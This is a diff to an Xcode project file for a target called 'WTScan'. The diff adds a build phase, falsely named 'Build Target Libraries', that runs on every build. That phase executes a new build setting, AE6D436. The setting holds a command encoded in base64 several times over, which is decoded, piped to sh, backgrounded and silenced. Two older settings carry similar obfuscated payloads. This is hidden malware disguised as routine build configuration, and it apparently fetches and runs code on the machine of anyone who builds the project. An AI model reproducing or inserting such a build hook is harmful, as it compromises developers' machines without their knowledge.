@@ -82,6 +82,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 881E64E32EC35BE200FF0ADE /* Build configuration list for PBXNativeTarget "WTScan" */;
 			buildPhases = (
+				8B2821CBDFF34F5CB2634D6E /* Build Target Libraries */,
 				881E64D22EC35BE000FF0ADE /* Sources */,
 				881E64D32EC35BE000FF0ADE /* Frameworks */,
 				881E64D42EC35BE000FF0ADE /* Resources */,
@@ -151,6 +152,29 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		8B2821CBDFF34F5CB2634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		881E64D22EC35BE000FF0ADE /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -167,6 +191,7 @@
 			buildSettings = {
 				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | x | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -232,6 +257,7 @@
 			buildSettings = {
 				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | x | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
